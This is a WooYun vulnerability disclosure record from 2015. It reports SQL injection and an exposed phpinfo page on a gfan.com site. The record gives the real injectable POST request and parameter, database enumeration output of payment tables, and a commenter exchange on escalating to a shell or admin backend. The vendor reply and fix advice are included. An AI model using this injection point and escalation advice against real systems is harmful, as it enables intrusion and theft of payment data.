{"id": 34214, "wybug_id": "wooyun-2015-0108681", "wybug_title": "机锋网某站点Mysql注入&amp;phpinfo", "wybug_corp": "机锋网", "wybug_author": "大懒", "wybug_date": "2015-04-17 21:02", "wybug_open_date": "2015-06-01 21:32", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向公众公开  简要描述： 机锋网某站点存在mysql注入及phpinfo 详细说明：  首先扫到了phpinfo这个文件，http://my.gfan.com/info.php\n\n然后就想着找一找注入和文件包含这样的漏洞，于是就在my.gfan.com找到一个注入点POST URL:http://my.gfan.com/accountPOST参数approach=chargeweb&chargeend=2013-06-15&chargepayment=1&chargestart=2013-06-15&chargestatus=2&types=charge 问题参数：chargepaymentcurrent user:    'my_web@10.8.8.%'可惜当前的用户是他，权限不够。不过这里毕竟是一个风险，花时间还是可以Getshell的\n\n   漏洞证明：  available databases [4]:[*] gfan_game[*] gfan_gamepay[*] gfan_pay[*] information_schemaDatabase: gfan_pay[63 tables]+------------------------------+| user                         || action_type                  || admin_operate_log            || admin_user                   || app_info_apk                 || card_config                  || channel                      || charge_log                   || check_check_info             || check_check_status           || client_channel               || consume_log                  || contrast_appkey_productid    || login_log_20121222           || login_log_tmp                || payorder_status_log          || rebate_info                  || recharge_alipay_notify_log   || recharge_channel             || recharge_channel_account     || recharge_dic_channel         || recharge_log                 || recharge_mo9_notify_log      || recharge_order               || recharge_order_history       || recharge_order_operate_log   || recharge_order_reb           || recharge_request             || recharge_submit              || recharge_tenpay_notify_log   || recharge_uc_recharge_log     || recharge_unionpay_notify_log || recharge_unionpay_trade_log  || sdk_app                      || sdk_message_client_log       || sdk_message_pay_log          || sdk_pay_log                  || sdk_pay_point_arrive         || sdk_save_ios_order           || sdk_sp_dictionary            || sdk_sp_sms                   || shenzhoufu                   || sp_channelinfo_admini        || sp_companyinfo_admini        || sp_developerinfo_admini      || sp_errormessages_log         || sp_install_forwardtell_log   || sp_partname_admini           || sp_pay_forwardtell_log       || sp_spcustom_admini           || sp_statusreport_log          || sp_support_admini            || sp_uploadinterface_log       || sp_userinfo_admini           || sp_version_admini            || test                         || tgr_getcharge_logbyuid       || tgr_getconsume_logbyuid      || tgr_getsdk_appbyuid          || uc_pay_log                   || uc_uid_imei                  || user_payorder_url            || wap_test                     |+------------------------------+Database: gfan_gamepay+-------------------+---------+| Table             | Entries |+-------------------+---------+| gamepay_order     | 49027   || gamepay_usercheck | 44      || gamepay_server    | 43      || gamepay_qz        | 32      || gamepay_channel   | 5       || gamepay_rate      | 3       || gamepay_param     | 2       |+-------------------+---------+   修复方案：  1.删除phpinfo2.过滤单引号及对业务无影响的特殊字符   版权声明：转载请注明来源 大懒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-17 21:30 厂商回复： 修复中，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-01 22:05 |    \t\tdel0xphy \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 学习)\t\t \n  请教，普通权限有哪些方面可以尝试getshell呢？    \n     2015-06-02 09:57 |    \t\t大懒 \t\t\t( 普通白帽子  |\t\t\t        Rank:239 漏洞数:45        )\t\t \n  @del0xphy 如果说该sql注入漏洞无法提权拿shell，那么就是通过他收集信息，获取数据，进一步利用，如果有账号密码可以，寻找后台，登录后台进一步利用    \n     2015-06-02 11:39 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n  屌屌的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}